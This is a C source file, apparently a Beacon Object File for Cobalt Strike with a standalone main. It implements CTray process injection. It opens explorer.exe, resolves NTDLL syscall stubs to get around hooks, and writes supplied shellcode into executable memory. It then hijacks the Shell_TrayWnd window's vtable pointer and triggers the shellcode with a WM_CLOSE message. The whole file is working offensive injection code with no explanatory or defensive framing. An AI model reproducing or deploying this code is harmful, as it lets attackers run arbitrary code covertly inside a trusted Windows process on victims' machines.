#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winternl.h>
#include <stddef.h>
#include "beacon.h"
#include "bofdefs.h"
#include "ntdefs.h"
#include "base.c"
#include "injection.c"

// extra window memory bytes for Shell_TrayWnd
typedef struct _ctray_vtable {
    LPVOID vTable;    // change to remote memory address
    LPVOID AddRef;    // add reference
    LPVOID Release;   // release procedure
    LPVOID WndProc;   // window procedure (change to lpShellcode)
} CTray;
    
typedef struct _ctray_obj {
    CTray *vtbl;
} CTrayObj;

DWORD ctray(LPBYTE lpShellcodeBuffer, DWORD dwShellcodeBufferSize)
{
    DWORD  dwErrorCode = ERROR_SUCCESS;
    HWND hWnd = NULL;
    DWORD dwProcessId = 0;
    HANDLE hProcess = NULL;
    PHMOD hNTDLL = NULL;
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = NULL;
    NtReadVirtualMemory_t NtReadVirtualMemory = NULL;
    NtWriteVirtualMemory_t NtWriteVirtualMemory = NULL;
    NtFreeVirtualMemory_t     NtFreeVirtualMemory = NULL;
    SIZE_T RegionSize = 0;
    LPVOID lpRemoteShellcodeBuffer = NULL;
    LPVOID lpRemoteCTrayBuffer = NULL;
    CTray cTray;
    LPVOID lpCTray = NULL;
    LPVOID lpPreviousLong = NULL;
    DWORD dwInstanceId = 0;
 
 /*
    internal_printf("lpShellcodeBuffer:     %p\n", lpShellcodeBuffer);
    internal_printf("dwShellcodeBufferSize: %lu\n", dwShellcodeBufferSize);
*/

    // Custom LoadLibrary on NTDLL
    hNTDLL = _LoadLibrary(NTDLL_PATH);
    if(NULL == hNTDLL) { goto end; }

    // Get the syscall addresses
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSyscallStub(hNTDLL, "NtAllocateVirtualMemory");
    NtReadVirtualMemory = (NtReadVirtualMemory_t)GetSyscallStub(hNTDLL, "NtReadVirtualMemory");
    NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetSyscallStub(hNTDLL, "NtWriteVirtualMemory");
    NtFreeVirtualMemory = (NtFreeVirtualMemory_t)GetSyscallStub(hNTDLL, "NtFreeVirtualMemory");
    if ((NULL == NtAllocateVirtualMemory) || 
        (NULL == NtReadVirtualMemory) || 
        (NULL == NtWriteVirtualMemory) || 
        (NULL == NtFreeVirtualMemory)
    )
    {
        dwErrorCode = ERROR_PROC_NOT_FOUND;
        internal_printf("GetSyscallStub failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Get the handle to the target window
    hWnd = USER32$FindWindowA("Shell_TrayWnd", NULL);
    if (NULL == hWnd)
    {
        dwErrorCode = ERROR_INVALID_WINDOW_HANDLE;
        internal_printf("Failed to find a Shell_TrayWnd window handle\n");
        goto end;
    }

    // Get the process ID for process owning the window
    USER32$GetWindowThreadProcessId(hWnd, &dwProcessId);

    internal_printf("Injecting into explorer.exe with PID:%lu\n", dwProcessId);

    // Open target process
    hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (NULL == hProcess)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("OpenProcess failed (%lu)\n", dwErrorCode);
        goto end;
    }


#ifdef _WIN64
    lpCTray = (LPVOID)USER32$GetWindowLongPtrA(hWnd, 0);
#else
    lpCTray = (LPVOID)USER32$GetWindowLongA(hWnd, 0);
#endif
    if (NULL == lpCTray)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("GetWindowLongPtrA failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Read in the current CTray from the remote process
    intZeroMemory(&cTray, sizeof(cTray));
    dwErrorCode = NtReadVirtualMemory(
        hProcess, 
        lpCTray, 
        (LPVOID)&cTray.vTable, 
        sizeof(LPVOID), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtReadVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }
    dwErrorCode = NtReadVirtualMemory(
        hProcess, 
        (LPVOID)cTray.vTable, 
        (LPVOID)&cTray.AddRef, 
        3*sizeof(LPVOID), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtReadVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Allocate remote shellcode buffer
    RegionSize = dwShellcodeBufferSize + 1;
    dwErrorCode = NtAllocateVirtualMemory(
        hProcess, 
        &lpRemoteShellcodeBuffer, 
        0, 
        &RegionSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtAllocateVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Write the shellcode to the remote buffer
    dwErrorCode = NtWriteVirtualMemory(
        hProcess, 
        lpRemoteShellcodeBuffer, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize, 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Allocate the new CTray
    RegionSize = sizeof(cTray) + 1;
    dwErrorCode = NtAllocateVirtualMemory(
        hProcess, 
        &lpRemoteCTrayBuffer, 
        0, 
        &RegionSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtAllocateVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }
    
    // Set up the new CTray
    cTray.vTable  = (LPVOID)((LPBYTE)lpRemoteCTrayBuffer + sizeof(LPVOID));
    cTray.WndProc = (LPVOID)lpRemoteShellcodeBuffer;
    
    // Write the new CTray
    dwErrorCode = NtWriteVirtualMemory(
        hProcess, 
        lpRemoteCTrayBuffer, 
        &cTray, 
        sizeof(cTray), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }
    
    // Update the remote CTray pointer
#ifdef _WIN64
    lpPreviousLong = (LPVOID)USER32$SetWindowLongPtrA(hWnd, 0, (LONG_PTR)lpRemoteCTrayBuffer);
#else
    lpPreviousLong = (LPVOID)USER32$SetWindowLongA(hWnd, 0, (LONG)lpRemoteCTrayBuffer);
#endif
    if (NULL == lpPreviousLong)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("SetWindowLongPtrA failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Trigger execution
    USER32$PostMessageA(hWnd, WM_CLOSE, 0, 0);

    KERNEL32$Sleep(10);

    // Restore the original CTray
#ifdef _WIN64
    lpPreviousLong = (LPVOID)USER32$SetWindowLongPtrA(hWnd, 0, (LONG_PTR)lpCTray);
#else
    lpPreviousLong = (LPVOID)USER32$SetWindowLongA(hWnd, 0, (LONG)lpCTray);
#endif
    if (NULL == lpPreviousLong)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("SetWindowLongPtrA failed (%lu)\n", dwErrorCode);
        goto end;
    }

end:
    // Free the new remote CTray
    if (lpRemoteCTrayBuffer)
    {
        NtFreeVirtualMemory(
            hProcess, 
            lpRemoteCTrayBuffer, 
            0, 
            MEM_RELEASE | MEM_DECOMMIT
        );
        lpRemoteCTrayBuffer = NULL;
    }
    
    // Free remote shellcode?
    /*
    if (lpRemoteShellcodeBuffer)
    {
        NtFreeVirtualMemory(
            hProcess, 
            lpRemoteShellcodeBuffer, 
            0, 
            MEM_RELEASE | MEM_DECOMMIT
        );
        lpRemoteShellcodeBuffer = NULL;
    }
    */

    if (hProcess)
    {
        KERNEL32$CloseHandle(hProcess);
        hProcess = NULL;
    }

    return dwErrorCode;
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
	datap   parser;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    
    // Get the arguments <SHELLCODE>
	BeaconDataParse(&parser, Buffer, Length);
    lpShellcodeBuffer = (LPBYTE) BeaconDataExtract(&parser, (int*)(&dwShellcodeBufferSize));
	
    if(!bofstart())
	{
		return;
	}

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__   
    internal_printf("ctray( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif
    dwErrorCode = ctray(
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ctray failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

	printoutput(TRUE);
};
#else
int main(int argc, const char* argv[])
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;

    // Check to see if we received any arguments
    if (2 != argc)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid number of arguments\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: %s <SHELLCODE>\n", argv[0]);
        goto end;
    }

    dwErrorCode = ReadFileIntoBuffer(argv[1], &lpShellcodeBuffer, &dwShellcodeBufferSize);
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ReadFileIntoBuffer failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__       
    internal_printf("ctray( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = ctray(
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ctray failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

    if(lpShellcodeBuffer)
    {
        intFree(lpShellcodeBuffer);
        lpShellcodeBuffer = NULL;
    }

    return dwErrorCode;
}
#endif
